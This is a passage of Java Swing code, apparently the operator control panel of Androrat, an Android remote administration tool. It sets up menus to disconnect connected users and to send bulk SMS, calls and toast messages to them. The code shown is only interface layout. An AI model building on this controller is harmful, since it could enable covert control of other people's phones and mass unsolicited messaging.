        jMenu1.add(buttonExit);
        
        chckbxmntmShowLogs = new JCheckBoxMenuItem("Show logs");
        chckbxmntmShowLogs.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		buttonShowLogs();
        	}
        });
        
        mntmPort = new JMenuItem("Select port");
        mntmPort.addActionListener(new ActionListener() {
        	public void actionPerformed(ActionEvent e) {
        		fireSelectPort();
        	}
        });
        jMenu1.add(mntmPort);
        chckbxmntmShowLogs.setSelected(true);
        jMenu1.add(chckbxmntmShowLogs);

        jMenuBar1.add(jMenu1);

        jMenu2.setText("Client actions");
        
        buttonUserGUI.setText("Open user interface");
        buttonUserGUI.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_U, InputEvent.CTRL_MASK));
        buttonUserGUI.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonUserGUIActionPerformed();
            }
        });
        jMenu2.add(buttonUserGUI);

        buttonRemoveUser.setText("Disconnect user");
        buttonRemoveUser.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_R, InputEvent.CTRL_MASK));
        buttonRemoveUser.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonRemoveUserActionPerformed();
            }
        });
        jMenu2.add(buttonRemoveUser);

        jMenuBar1.add(jMenu2);

        setJMenuBar(jMenuBar1);
        
        mnBulkActions = new JMenu("Bulk actions");
        jMenuBar1.add(mnBulkActions);
        
        mntmToastit = new JMenuItem("Toast-it");
        mntmToastit.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireBulkToast();
        	}
        });
        mnBulkActions.add(mntmToastit);
        
        mntmSendSms = new JMenuItem("Send SMS");
        mntmSendSms.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireBulkSMS();
        	}
        });
        mnBulkActions.add(mntmSendSms);
        
        mntmGiveCall = new JMenuItem("Give call");
        mntmGiveCall.addActionListener(new ActionListener() {
        	@Override
			public void actionPerformed(ActionEvent e) {
        		fireBulkCall();
        	}
        });
        mnBulkActions.add(mntmGiveCall);
        
        mnAbout = new JMenu("About");
        jMenuBar1.add(mnAbout);
        buttonAbout = new javax.swing.JMenuItem();
        mnAbout.add(buttonAbout);
        
        buttonAbout.setText("About Androrat");
        buttonAbout.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonAboutActionPerformed();
            }
        });
        
        splitPane = new JSplitPane();
        splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        layout.setHorizontalGroup(
        	layout.createParallelGroup(Alignment.LEADING)
        		.addComponent(splitPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 671, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
        	layout.createParallelGroup(Alignment.LEADING)
        		.addComponent(splitPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 305, Short.MAX_VALUE)
        );
        
        jScrollPane = new JScrollPane();
        splitPane.setRightComponent(jScrollPane);
        
        logPanel = new ColorPane();
        jScrollPane.setViewportView(logPanel);
        
        jScrollPane1 = new javax.swing.JScrollPane();
        splitPane.setLeftComponent(jScrollPane1);
        splitPane.setDividerLocation(200);
        userTable = new javax.swing.JTable();
        userTable.setRowMargin(3);
        userTable.setRowHeight(48);
        userTable.setFont(new Font("Dialog", Font.PLAIN, 14));
        userTable.setAutoResizeMode(JTable.AUTO_RESIZE_NEXT_COLUMN);
        userTable.addMouseListener(new MouseAdapter() {
        	@Override
        	public void mouseClicked(MouseEvent e) {
        		userMouseClicked(e);
        	}
        });
        jScrollPane1.setViewportView(userTable);
        getContentPane().setLayout(layout);
        
        pack();
    }

    /**
     * Um die Tabelle der User in der Mitte des Fensters darzustellen.
     * @param table Die Tabelle
     */
    private void centrerTable(JTable table) {     DefaultTableCellRenderer custom = new DefaultTableCellRenderer(); 
	    custom.setHorizontalAlignment(JLabel.CENTER);
	    userTable.getColumnModel().getColumn(0).setPreferredWidth(56);
	    for (int i=1 ; i<table.getColumnCount() ; i++) 
	    	table.getColumnModel().getColumn(i).setCellRenderer(custom); 
    }

    public boolean getDownloadComplete(){
        return downloadComplete;
    }
    public void setDownloadComplete(boolean b){
        downloadComplete = b;
    }
}
